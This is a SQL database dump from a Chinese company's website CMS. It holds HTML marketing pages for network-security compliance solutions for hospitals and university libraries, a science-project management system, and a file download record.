INSERT INTO `xyh_sever` VALUES ('12','44','医疗卫生系统安全等级保护建设解决方案','<h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 医院等级保护建设过程：</h1><p class=\"publicp\">“适度安全、分级保护”是等级保护安全建设的基本方法，等级保护可以把业务系统、信息资产、安全边界等进行“等级化”，分而治之，从而实现信息安全等级保护的“适度安全、分级保护”思想。海峡信息以国家相关法规标淮为依据，以海峡信息等级保护知识库和支撑平台为基础，形成合理的安全评估、规划设计、解决方案和系列安全服务，构成等级保护安全建设体系。</p><p class=\"publicp\">医院信息系统进行等级保护安全建设总体流程如下：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/595996e504dd1.jpg\"/></p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 方案设计框架：</h1><p class=\"publicp\">医院信息系统安全等级保护体系框架在国家政策、法律法规指引的前提下，以安全基础设施为依托，与信息系统的业务流程、应用架构和数据资源紧密结合，从安全技术、安全管理为要素进行框架设计。根据等保安全要求，海峡信息提出如下的安全整改建议，以下是信息安全保障总体框架模型。</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/595997251da03.jpg\"/></p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 方案建设内容：</h1><p class=\"publicp\">海峡信息参照公安部等级保护基本要求进行等级保护安全体系设计，用于指导和促进医院信息系统的等级保护建设工作。安全技术体系设计将从网络安全、主机安全、应用安全等方面进行，以下图医院信息系统拓扑为例，依据福建省卫生厅及福建省公安厅发布的相关文件，按等保三级进行改造后：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/595997789e24f.jpg\"/></p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户价值：</h1><p class=\"publicp\">海峡信息医院信息系统等级保护三级整改方案参照等级保护基本要求等标淮，同时进行总体的安全技术设计，将不同区域、不同层面的安全保护措施形成有机的安全保护体系，采用成熟可靠的安全产品，对网络安全、主机安全、应用安全等方面进行改造建设，最大程度发挥安全措施的保护能力，帮助客户信息系统在安全性上达到对应等级保护要求的强度和标淮。该方案从整体上进行规划设计，能够避免重复建设，充分保炉好用户的投资。</p>');
INSERT INTO `xyh_sever` VALUES ('13','45','教育行业信息化安全建设解决方案','<h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 安全需求分析：</h1><p class=\"publicp\">高校图书馆网络肩负着整个图书馆系统正常运行、电子阅览室正常使用、馆藏数字资源的正常获取利用、文献检索实习课的正常教学等重要任务，甚至还涉及到学生的缴费金额，图书馆网络一旦瘫痪，可以说图书馆的所有业务即将被迫停止。鉴于图书馆的重要性，作为图书馆网络中的技术人员，必须加强防范意识，加强自身专业技能的培训，不断学习、互相切磋、共同研究，形成一支高素质、高水平的科研团队。</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/595998c456cbc.jpg\"/></p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 图书馆安全防护方案：</h1><p class=\"publicp\">根据上述图书馆网络建设中出现的问题与需求，海峡信息凭借丰富的图书馆网络安全建设经验，提出了高安全、高性能、易管理的高校图书馆网络安全解决方案。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">边界防护建设</span></p><p class=\"publicp\">通过部署防火墙实现互联网和教科网双网的接入，根据高校的业务特点、行业背景、管理制度所制定的安全策略，运用包过滤、代理网关、NAT转换、IP+MAC地址绑定等技术，实现对出入网络的信息流进行全面的控制。通过部署防火墙有效的防止了黑客对图书馆网络系统的攻击，保护图书馆网络系统，重要信息、相应的电子资源不被入侵、删除、篡改、破坏等。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">VPN接入建设</span></p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/5959a4576cf42.jpg\"/></p><p class=\"publicp\">通过部署的VPN设备来实现对远程用户接入的需要。多校区图书馆间图书实行通借通还，并要求书目信息、流通信息准确、及时、安全。多校区图书馆可租用本地公网的宽带线路，利用VPN技术，将总馆与各分馆之间构建若干条虚拟专用网络，从而实现图书馆内部管理网络的互联。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">入侵防御建设</span></p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/5959a52f65629.jpg\"/></p><p class=\"publicp\">在网络边界，防火墙后端部署入侵防御系统。对访问内部服务区的数据包进行实时监测，当发现异常数据包时，以采取相应阻断或流量控制操作，或采用透明传发或Bypass的方式，并以事件的方式显示在控制台界面上，进行报警。根据高校图书馆的真实环境和应用系统，制定详细的入侵防御策略，保护高校图书馆内部的安全。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">上网行为管理建设</span></p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/5959a53697ef8.jpg\"/></p><p class=\"publicp\">上网行为可以有效的对上网数据流进行管控。基于帐号、密码的身份认证可以有效的审核终端学生的身份，防止非学校学生接入网络，破坏、利用高校图书馆资源。上网行为管理产品基于用户、时间、应用、带宽等元素对上网行为进行全面而灵活的策略设置，把网络风险管理从“被动式响应管理”提升为“主动式预警管理”，从“防范管理”提升为“控制管理”，把网络的“通信安全”提升为“应用安全”。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">WEB应用防护建设</span></p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/5959a53b8b221.jpg\"/></p><p class=\"publicp\">在发布服务器群前端架设一台黑盾Web防火墙。实现对WEB应用全方位的安全防护，阻断常见的应用扫描、应用攻击、应用DoS、应用数据流侦听等恶意行为。</p><p class=\"publicp\">事前，提供Web应用漏洞扫描功能，检测Web应用程序是否存在SQL注入、跨站脚本漏洞；</p><p class=\"publicp\">事中，对黑客入侵行为、SQL注入/跨站脚本等各类Web应用攻击、 DDOS攻击进行有效检测、阻断及防护；</p><p class=\"publicp\">事后，针对当前的安全热点问题，网页篡改及网页挂马，提供珍断功能，降低安全风险，维护网站的公信度。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 图书馆安全防护价值：</h1><p class=\"publicp\">海峡信息高校数字图书馆整体安全解决方案帯来的价值：</p><p class=\"publicp\">1、提供安全的网络边界防护，做到信任授权级别的安全接入；</p><p class=\"publicp\">2、提供高效的信息共享方式--VPN技术，让教职工在家或出差时，在学生在寒暑假时，安全便捷接入图书馆网络；</p><p class=\"publicp\">3、实现终端用户安全绿色上网，符合绿色校园网络建设的需求；</p><p class=\"publicp\">4、实现对各类WEB应用服务器的安全防护，通过事先、事中、事后三位一体的安全防护体系，对来自应用层的动态攻击进行全面的检测、防护以及过滤，保护高校图书馆业务的正常运行。</p><p class=\"publicp\">5、提供细粒度用户管理、全面的流量管控、精细化的应用可视化管控及攻击行为可视化的整体解决方案。</p>');
INSERT INTO `xyh_sever` VALUES ('14','35','大数据协同应用管理解决方案','<h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 科技计划项目管理解决方案：</h1><p class=\"publicp\">简介：根据全局规划和顶层设计，建立系统、全面的科技项目管理解决方案，实现科技业务全流程管理的信息化、系统化、规范化、智能化。主要功能有：专家管理、单位管理、申报管理、初审管理、网络评审管理、会议评审、管理评审、综合评审、立项管理、经费计划文管理、任务书管理、执行情况管理、任务书变更管理、验收管理、辅助决策分析管理、协调管理、通知公告管理、系统管理等。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 科学技术奖励管理解决方案：</h1><p class=\"publicp\">简介：提供面向省、市两级科学技术奖励的申报、评审、管理全过程的信息化、系统化、规范化、智能化的解决方案,提高奖励管理部门工作效率、降低办公成本,进一步提升科技奖励评审的科学性、公平性、公正性、公开性和准确性。主要功能有：专家管理、单位管理、申报管理、形审管理、网评管理、复评管理、终评管理、辅助决策分析管理、协调管理、通知公告管理、系统管理等。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 纪检监察管理解决方案：</h1><p class=\"publicp\">简介：提供科技项目全流程预警、监控、防范、监管的全套解决方案。主要实现对科技项目管理工作进行有效监管，对科技项目管理等科技行政管理主要行政权力，实行预警提示、实时监控，超前防范、动态监管，有力推动了科技行政管理部门勤政廉政建设。系统多次获得纪检部门领导的充份肯定，是我省厅级部门中最早建成并投入使用的对业务系统行政权力实施监管、监控的监察管理信息系统。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 创新券管理解决方案：</h1><p class=\"publicp\">简介：为加强科技创新券的管理，推动科技资源开放共享，引导中小微企业持续加大研发经费投入，营造大众创业、万众创新良好环境。创新券管理解决方案主要实现创新券的在线申报、推荐、审核、补助的全过程管理。</p><h1 class=\"publicSecTitle cg\"><img src=\"/uploads/img1/20170702/5958edcaaaf99.png\"/> 典型客户：</h1><p class=\"publicp cg\">福建省科学技术厅、福建省交通运输厅、福建农林大学、福建省科学技术奖励委员会、福建省科技型中小企业技术创新资金管理中心、福州市科学技术局、漳州市科学技术局、泉州市科学技术局、莆田市科学技术局、三明市科学技术局、南平市科学技术局、龙岩市科学技术局、宁德市科学技术局</p>');


# 转存表中的数据：xyh_soft 
INSERT INTO `xyh_soft` VALUES ('3',' 项目报备表','','','','','测试报备表','无','下载地址：$$$http://www.si.net.cn/zl/baobei.doc','项目报备表','','1','0','1','','1MB','','1492585340','1492531200','23','54','1','0','','0','0','1');


# 转存表中的数据：xyh_special 
INSERT INTO `xyh_special` VALUES ('1','文章汇集','','','','','http://img9.xyhcms.com/201410/53391df14c069.jpg!200X200.jpg','文章汇集','','1398668509','1398668509','82','0','1','1','','0','','Special_content.html','1');
